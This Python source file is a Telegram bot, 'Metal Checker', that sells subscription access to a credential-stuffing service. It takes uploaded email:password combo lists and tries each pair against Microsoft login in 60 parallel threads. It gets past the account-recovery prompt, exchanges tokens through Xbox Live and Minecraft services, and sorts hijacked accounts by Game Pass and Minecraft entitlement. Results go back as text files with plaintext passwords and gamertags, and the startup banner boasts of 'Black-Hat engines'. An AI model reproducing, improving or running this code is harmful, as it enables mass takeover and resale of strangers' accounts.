import os
import re
import time
import threading
import concurrent.futures
import sqlite3
import random
import io
from datetime import datetime, timedelta
import telebot
from telebot import types
import requests
import urllib3
import warnings

# ==========================================
# ⚙️ INITIAL SETTINGS & CODES INTEGRATION
# ==========================================
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES = 3
REQUEST_TIMEOUT = 10
THREAD_COUNT = 60  # Yüksek hız için thread sayısı artırıldı

# ==========================================
# 🗄️ DATABASE MANAGEMENT
# ==========================================
def init_db():
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            register_date TEXT,
            expiry_date TEXT,
            role TEXT,
            lang TEXT,
            total_scanned INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS keys (
            key_code TEXT PRIMARY KEY,
            duration TEXT,
            days INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS channels (
            channel_username TEXT PRIMARY KEY
        )
    """)
    # Owner hesabı ekleme
    cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (OWNER_ID,))
    if not cursor.fetchone():
        now = datetime.now().strftime("%m/%d/%Y")
        cursor.execute("INSERT INTO users VALUES (?, ?, ?, ?, ?, 0, 0)", 
                       (OWNER_ID, now, "INFINITY", "OWNER", "TR"))
    conn.commit()
    conn.close()

init_db()

# ==========================================
# 🔄 LIVE SESSION STATE TRACKING
# ==========================================
active_scans = {}

class LiveScan:
    def __init__(self, chat_id, total):
        self.chat_id = chat_id
        self.total = total
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.minecraft = 0
        self.gamepass = 0
        self.xbox = 0
        self.not_linked = 0
        self.retries = 0
        self.current_email = "Waiting..."
        self.start_time = time.time()
        self.is_running = True
        self._lock = threading.Lock()
        
        # Dosya çıktıları hafızada tutulur stop durumunda verilmek üzere
        self.results = {
            "Minecraft": [],
            "GamePass": [],
            "Xbox": [],
            "NotLinked": [],
            "2FA": []
        }

# ==========================================
# 🌐 LANGUAGE LOCALIZATION
# ==========================================
LANG_DICT = {
    "TR": {
        "welcome": "⚔️ *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için dil seçimi yapın.",
        "main_menu": "🤖 *Ana Menü* \n\nBir işlem seçiniz:",
        "stats_btn": "📊 İstatistiklerim",
        "merge_btn": "📂 Dosya Birleştir",
        "start_check": "🚀 Tarama Başlat (.txt gönder)",
        "admin_btn": "👑 Admin Paneli",
        "force_join": "❌ *Botu kullanabilmek için sponsor kanallara katılmanız gerekmektedir:*",
        "no_auth": "⚠️ Bu menüyü kullanmaya yetkiniz yok veya üyeliğiniz bulunmuyor.",
        "merge_start": "📂 Lütfen alt alta birleştirmek istediğiniz `.txt` dosyalarını tek tek gönderin. İşlemi bitirmek için *'BİRLEŞTİR'* butonuna tıklayın. (Maks 30 Dosya)",
        "scan_status": "📊 *Tarama Durumu: Taratılıyor...*\n\n✅ *Valid:* {}\n❌ *Bad:* {}\n⚠️ *2FA:* {}\n🔄 *Retry:* {}\n\n*--- HIT DETAYLARI ---*\n🟢 Minecraft: {}\n🔵 Game Pass: {}\n🟣 Xbox: {}\n🟡 Not Linked: {}\n\n📈 *İlerleme:* {:.1f}% | {}/{} | {} CPM\n📧 *Son Kontrol:* `{}`",
        "scan_stopped": "🛑 Tarama kullanıcı tarafından durduruldu! Biriken sonuçlar yükleniyor...",
        "scan_done": "🏁 Tarama başarıyla tamamlandı! Sonuç dosyalarınız aşağıdadır."
    },
    "EN": {
        "welcome": "⚔️ *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue.",
        "main_menu": "🤖 *Main Menu* \n\nSelect an action:",
        "stats_btn": "📊 My Statistics",
        "merge_btn": "📂 File Merger",
        "start_check": "🚀 Start Scan (Send .txt)",
        "admin_btn": "👑 Admin Panel",
        "force_join": "❌ *You must join our sponsor channels to use the bot:*",
        "no_auth": "⚠️ You do not have authorization or an active subscription.",
        "merge_start": "📂 Please send `.txt` files one by one to merge. When done, click the *'MERGE'* button. (Max 30 Files)",
        "scan_status": "📊 *Scan Status: Scanning...*\n\n✅ *Valid:* {}\n❌ *Bad:* {}\n⚠️ *2FA:* {}\n🔄 *Retry:* {}\n\n*--- HIT DETAILS ---*\n🟢 Minecraft: {}\n🔵 Game Pass: {}\n🟣 Xbox: {}\n🟡 Not Linked: {}\n\n📈 *Progress:* {:.1f}% | {}/{} | {} CPM\n📧 *Last Check:* `{}`",
        "scan_stopped": "🛑 Scan stopped by user! Uploading collected hits...",
        "scan_done": "🏁 Scan completed successfully! Your result files are below."
    }
}

def get_user_lang(user_id):
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else "TR"

def check_subscription(user_id):
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT expiry_date, role FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if not row: return False
    expiry, role = row
    if role in ["OWNER", "ADMIN"] or expiry == "INFINITY": return True
    exp_date = datetime.strptime(expiry, "%m/%d/%Y")
    return datetime.now() < exp_date

def is_subscribed_to_channels(user_id):
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT channel_username FROM channels")
    chans = [r[0] for r in cursor.fetchall()]
    conn.close()
    for ch in chans:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status in ['left', 'kicked']: return False
        except:
            continue
    return True

# ==========================================
# 🧠 EXTRACTED LOGIC FROM NEWFILE.PY
# ==========================================
def get_sftag(session):
    for _ in range(MAX_RETRIES):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match: return match.group(1), sftag
        except: pass
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    for _ in range(MAX_RETRIES):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None": return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    d = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None": return token, "success"
                except: pass
            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except: pass
    return None, "error"

from urllib.parse import urlparse, parse_qs
def get_xbox_token(session, ms_token):
    for _ in range(MAX_RETRIES):
        try:
            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
        except: pass
    return None, None

def get_xsts_token(session, xbox_token):
    for _ in range(MAX_RETRIES):
        try:
            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('Token')
        except: pass
    return None

def get_minecraft_token(session, uhs, xsts_token):
    for _ in range(MAX_RETRIES):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('access_token')
        except: pass
    return None

def check_entitlements(session, mc_token):
    for _ in range(MAX_RETRIES):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass', ["Xbox Game Pass"]
                elif '"product_minecraft"' in text: return 'Minecraft', ["Minecraft Java"]
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text: others.append("Legends")
                    if 'product_dungeons' in text: others.append("Dungeons")
                    if others: return 'Xbox: ' + ', '.join(others), others
                    return None, []
        except: pass
    return None, []

def get_profile(session, mc_token):
    for _ in range(MAX_RETRIES):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json()
            elif response.status_code == 404: return None
        except: pass
    return None

def get_xbox_profile(session, uhs, xsts_token):
    try:
        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
        response = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep", headers={"Authorization": auth_header, "x-xbl-contract-version": "2", "Accept": "application/json", "Accept-Language": "en-US"}, timeout=REQUEST_TIMEOUT)
        if response.status_code == 200:
            settings = {s["id"]: s.get("value", "N/A") for s in response.json().get("profileUsers", [{}])[0].get("settings", [])}
            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A"), "rep": settings.get("XboxOneRep", "N/A")}
    except: pass
    return {"gamertag": "N/A", "tier": "N/A", "rep": "N/A"}

# ==========================================
# ⚙️ CORE MULTI-THREAD ENGINE FOR BOT
# ==========================================
def core_scan_account(scan_obj, combo):
    if not scan_obj.is_running: return
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
            return
        email, password = parts[0], ':'.join(parts[1:])
        with scan_obj._lock: scan_obj.current_email = email

        session = requests.Session()
        session.verify = False
        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with scan_obj._lock: scan_obj.errors += 1; scan_obj.checked += 1
            return

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        if auth_status == "2fa":
            with scan_obj._lock:
                scan_obj.twofa += 1; scan_obj.checked += 1
                scan_obj.results["2FA"].append(f"{email}:{password}")
            return
        elif auth_status == "bad":
            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            with scan_obj._lock: scan_obj.errors += 1; scan_obj.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
            return

        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        gamertag, tier, rep = xbox_profile.get("gamertag", "N/A"), xbox_profile.get("tier", "N/A"), xbox_profile.get("rep", "N/A")

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            with scan_obj._lock: scan_obj.bad += 1; scan_obj.checked += 1
            return

        account_type, subs = check_entitlements(session, mc_token)
        capture = f"Email: {email}\nPassword: {password}\nGamertag: {gamertag}\nTier: {tier}\nReputation: {rep}\n"

        if not account_type:
            with scan_obj._lock:
                scan_obj.not_linked += 1; scan_obj.hits += 1; scan_obj.checked += 1
                scan_obj.results["NotLinked"].append(capture + "Type: Xbox (Not Linked)\n" + "="*30)
            return

        profile = get_profile(session, mc_token)
        name = profile.get('name', 'N/A') if profile else "Not Set"
        capes = ", ".join([c["alias"] for c in profile.get("capes", [])]) if (profile and "capes" in profile) else "None"
        subs_str = ", ".join(subs) if subs else "None"

        full_capture = capture + f"MC Name: {name}\nCapes: {capes}\nType: {account_type}\nSubscriptions: {subs_str}\n" + "="*30

        with scan_obj._lock:
            scan_obj.hits += 1; scan_obj.checked += 1
            if 'Ultimate' in account_type or 'Game Pass' in account_type:
                scan_obj.gamepass += 1
                scan_obj.results["GamePass"].append(full_capture)
            elif 'Minecraft' in account_type:
                scan_obj.minecraft += 1
                scan_obj.results["Minecraft"].append(full_capture)
            else:
                scan_obj.xbox += 1
                scan_obj.results["Xbox"].append(full_capture)
    except:
        with scan_obj._lock: scan_obj.errors += 1; scan_obj.checked += 1

# ==========================================
# 🖥️ TELEGRAM INTERFACE & MENU HANDLERS
# ==========================================
def build_main_keyboard(user_id):
    lang = get_user_lang(user_id)
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton(LANG_DICT[lang]["stats_btn"], callback_data="view_stats"),
        types.InlineKeyboardButton(LANG_DICT[lang]["merge_btn"], callback_data="merge_files")
    )
    if user_id == OWNER_ID or is_admin(user_id):
        kb.add(types.InlineKeyboardButton(LANG_DICT[lang]["admin_btn"], callback_data="admin_panel"))
    return kb

def is_admin(user_id):
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT role FROM users WHERE user_id = ? AND role IN ('ADMIN', 'OWNER')", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return True if row else False

@bot.message_with_type_filter(content_types=['text'])
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid = message.from_user.id
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT lang FROM users WHERE user_id = ?", (uid,))
    row = cursor.fetchone()
    
    if not row:
        now = datetime.now().strftime("%m/%d/%Y")
        # İlk kayıt varsayılan haftalık ücretsiz veya boş
        cursor.execute("INSERT INTO users VALUES (?, ?, ?, ?, ?, 0, 0)", 
                       (uid, now, (datetime.now() + timedelta(days=7)).strftime("%m/%d/%Y"), "USER", "TR"))
        conn.commit()
        lang = "TR"
    else:
        lang = row[0]
    conn.close()

    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="set_lang_TR"),
           types.InlineKeyboardButton("🇺🇸 English", callback_data="set_lang_EN"))
    bot.send_message(message.chat.id, LANG_DICT[lang]["welcome"], reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data.startswith("set_lang_"))
def callback_set_lang(call):
    lang = call.data.split("_")[2]
    uid = call.from_user.id
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, uid))
    conn.commit()
    conn.close()
    
    bot.edit_message_text(LANG_DICT[lang]["main_menu"], call.message.chat.id, call.message.message_id, reply_markup=build_main_keyboard(uid))

@bot.callback_query_handler(func=lambda call: call.data == "view_stats")
def callback_stats(call):
    uid = call.from_user.id
    lang = get_user_lang(uid)
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT register_date, expiry_date, role, total_scanned, total_hits FROM users WHERE user_id = ?", (uid,))
    row = cursor.fetchone()
    conn.close()

    if row:
        reg, exp, role, total_scanned, total_hits = row
        success_rate = (total_hits / total_scanned * 100) if total_scanned > 0 else 0.0
        text = f"📊 *İstatistikleriniz / Your Statistics*\n\n👤 Kullanıcı ID: `{uid}`\n📅 Kayıt: {reg}\n👑 Üyelik: 📅 {role}\n📅 Bitiş: {exp}\n\n📈 Aktivite:\n✅ Toplam Tarama: {total_scanned}\n💎 Toplam Hit: {total_hits}\n🎯 Başarı Oranı: {success_rate:.2f}%\n📊 Bugünkü Tarama: 0"
        bot.send_message(call.message.chat.id, text, reply_markup=build_main_keyboard(uid))

# ==========================================
# 🛑 SCAN CONTROLLER (/STOP)
# ==========================================
@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    chat_id = message.chat.id
    lang = get_user_lang(message.from_user.id)
    if chat_id in active_scans:
        active_scans[chat_id].is_running = False
        bot.send_message(chat_id, LANG_DICT[lang]["scan_stopped"])
    else:
        bot.send_message(chat_id, "❌ Aktif tarama bulunamadı.")

# ==========================================
# 🚀 TXT COMBO LOADER & DISPATCHER
# ==========================================
@bot.message_handler(content_types=['document'])
def handle_combo_file(message):
    uid = message.from_user.id
    chat_id = message.chat.id
    lang = get_user_lang(uid)

    if not check_subscription(uid):
        bot.send_message(chat_id, LANG_DICT[lang]["no_auth"])
        return
        
    if not is_subscribed_to_channels(uid):
        send_force_join_msg(chat_id, lang)
        return

    # Dosya birleştirme modundaysa süreci oraya akıt
    if chat_id in user_merge_sessions:
        process_merge_document(message)
        return

    if not message.document.file_name.endswith('.txt'):
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        combos = downloaded_file.decode('utf-8', errors='ignore').splitlines()
    except:
        bot.send_message(chat_id, "❌ Dosya okunamadı.")
        return

    combos = [c.strip() for c in combos if ":" in c]
    total = len(combos)
    if total == 0:
        bot.send_message(chat_id, "❌ Geçerli combo bulunamadı.")
        return

    scan_obj = LiveScan(chat_id, total)
    active_scans[chat_id] = scan_obj

    status_msg = bot.send_message(chat_id, "Initializing scan layout...")

    # UI Refresh Loop Thread
    def ui_updater():
        while scan_obj.is_running and scan_obj.checked < scan_obj.total:
            time.sleep(5)
            elapsed = time.time() - scan_obj.start_time
            cpm = int((scan_obj.checked / elapsed) * 60) if elapsed > 0 else 0
            pct = (scan_obj.checked / scan_obj.total) * 100
            
            text = LANG_DICT[lang]["scan_status"].format(
                scan_obj.hits, scan_obj.bad, scan_obj.twofa, scan_obj.retries,
                scan_obj.minecraft, scan_obj.gamepass, scan_obj.xbox, scan_obj.not_linked,
                pct, scan_obj.checked, scan_obj.total, cpm, scan_obj.current_email
            )
            try:
                bot.edit_message_text(text, chat_id, status_msg.message_id)
            except: pass

    threading.Thread(target=ui_updater, daemon=True).start()

    # Core execution pool
    def run_pool():
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            futures = [executor.submit(core_scan_account, scan_obj, c) for c in combos]
            concurrent.futures.wait(futures)
        
        # Tarama Bittiğinde veya Durdurulduğunda DB güncellemesi yap
        conn = sqlite3.connect("metal_checker.db")
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET total_scanned = total_scanned + ?, total_hits = total_hits + ? WHERE user_id = ?", (scan_obj.checked, scan_obj.hits, uid))
        conn.commit()
        conn.close()

        # Dosyaları teslim et
        bot.send_message(chat_id, LANG_DICT[lang]["scan_done"])
        for cat, lines in scan_obj.results.items():
            if lines:
                buf = io.BytesIO("\n".join(lines).encode('utf-8'))
                buf.name = f"{cat}.txt"
                bot.send_document(chat_id, buf)
        
        active_scans.pop(chat_id, None)

    threading.Thread(target=run_pool, daemon=True).start()

def send_force_join_msg(chat_id, lang):
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT channel_username FROM channels")
    chans = [r[0] for r in cursor.fetchall()]
    conn.close()
    
    kb = types.InlineKeyboardMarkup()
    for ch in chans:
        kb.add(types.InlineKeyboardButton(f"📢 Kanalı Takip Et", url=f"https://t.me/{ch}"))
    bot.send_message(chat_id, LANG_DICT[lang]["force_join"], reply_markup=kb)

# ==========================================
# 📂 FILE MERGER FEATURE (MAX 30 TXT)
# ==========================================
user_merge_sessions = {}

@bot.callback_query_handler(func=lambda call: call.data == "merge_files")
def callback_merge(call):
    chat_id = call.message.chat.id
    lang = get_user_lang(call.from_user.id)
    user_merge_sessions[chat_id] = []
    
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(types.KeyboardButton("BİRLEŞTİR / MERGE"))
    bot.send_message(chat_id, LANG_DICT[lang]["merge_start"], reply_markup=kb)

def process_merge_document(message):
    chat_id = message.chat.id
    if len(user_merge_sessions[chat_id]) >= 30:
        bot.send_message(chat_id, "❌ Maksimum 30 dosya limitine ulaştınız.")
        return
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        user_merge_sessions[chat_id].append(downloaded)
        bot.send_message(chat_id, f"📥 {len(user_merge_sessions[chat_id])}. dosya kuyruğa eklendi.")

@bot.message_handler(func=lambda msg: msg.text in ["BİRLEŞTİR / MERGE", "BİRLEŞTİR", "MERGE"])
def process_merge_action(message):
    chat_id = message.chat.id
    if chat_id not in user_merge_sessions or not user_merge_sessions[chat_id]:
        return
    
    combined_data = []
    for file_bytes in user_merge_sessions[chat_id]:
        combined_data.append(file_bytes.decode('utf-8', errors='ignore'))
    
    final_txt = "\n".join(combined_data)
    buf = io.BytesIO(final_txt.encode('utf-8'))
    buf.name = "Merged_Combos.txt"
    
    bot.send_document(chat_id, buf, caption="✅ Tüm dosyalarınız alt alta birleştirildi.", reply_markup=types.ReplyKeyboardRemove())
    user_merge_sessions.pop(chat_id, None)

# ==========================================
# 👑 ADMIN PANEL & OWNER MANAGEMENT
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
def callback_admin_panel(call):
    uid = call.from_user.id
    if uid != OWNER_ID and not is_admin(uid): return
    
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("➕ Key Üret", callback_data="adm_gen_key"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast"),
        types.InlineKeyboardButton("🔒 Kanalları Yönet", callback_data="adm_channels")
    )
    if uid == OWNER_ID:
        kb.add(
            types.InlineKeyboardButton("➕ Admin Ekle", callback_data="adm_add_admin"),
            types.InlineKeyboardButton("❌ Admin Çıkar", callback_data="adm_rem_admin")
        )
    bot.send_message(call.message.chat.id, "👑 *Metal Checker Kontrol Paneli*", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "adm_gen_key")
def callback_gen_key(call):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("1 Gün", callback_data="key_1"),
        types.InlineKeyboardButton("3 Gün", callback_data="key_3"),
        types.InlineKeyboardButton("1 Hafta", callback_data="key_7"),
        types.InlineKeyboardButton("1 Ay", callback_data="key_30"),
        types.InlineKeyboardButton("Sonsuz", callback_data="key_inf")
    )
    bot.send_message(call.message.chat.id, "Key süresi seçin:", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data.startswith("key_"))
def callback_save_key(call):
    duration = call.data.split("_")[1]
    days = 0
    if duration == "1": days = 1
    elif duration == "3": days = 3
    elif duration == "7": days = 7
    elif duration == "30": days = 30
    else: days = 99999
    
    generated_key = f"METAL-{random.randint(100000,999999)}-{random.randint(1000,9999)}"
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO keys VALUES (?, ?, ?)", (generated_key, duration.upper(), days))
    conn.commit()
    conn.close()
    
    bot.send_message(call.message.chat.id, f"🔑 *Anahtar Üretildi:*\n`{generated_key}`")

# Key aktivasyonu mesaj yakalayıcı
@bot.message_handler(func=lambda msg: msg.text and msg.text.startswith("METAL-"))
def handle_key_activation(message):
    uid = message.from_user.id
    key_code = message.text.strip()
    conn = sqlite3.connect("metal_checker.db")
    cursor = conn.cursor()
    cursor.execute("SELECT days FROM keys WHERE key_code = ?", (key_code,))
    row = cursor.fetchone()
    
    if row:
        days = row[0]
        cursor.execute("DELETE FROM keys WHERE key_code = ?", (key_code,))
        expiry = "INFINITY" if days > 1000 else (datetime.now() + timedelta(days=days)).strftime("%m/%d/%Y")
        cursor.execute("UPDATE users SET expiry_date = ? WHERE user_id = ?", (expiry, uid))
        conn.commit()
        bot.send_message(message.chat.id, f"🎉 *Üyeliğiniz Aktive Edildi!* Bitiş: {expiry}")
    else:
        bot.send_message(message.chat.id, "❌ Geçersiz anahtar.")
    conn.close()

# ==========================================
# 🚀 RAILWAY RUNTIME LOOP
# ==========================================
if __name__ == "__main__":
    print("[ArZ] Metal Checker Bot is running successfully on Black-Hat engines...")
    bot.infinity_polling()

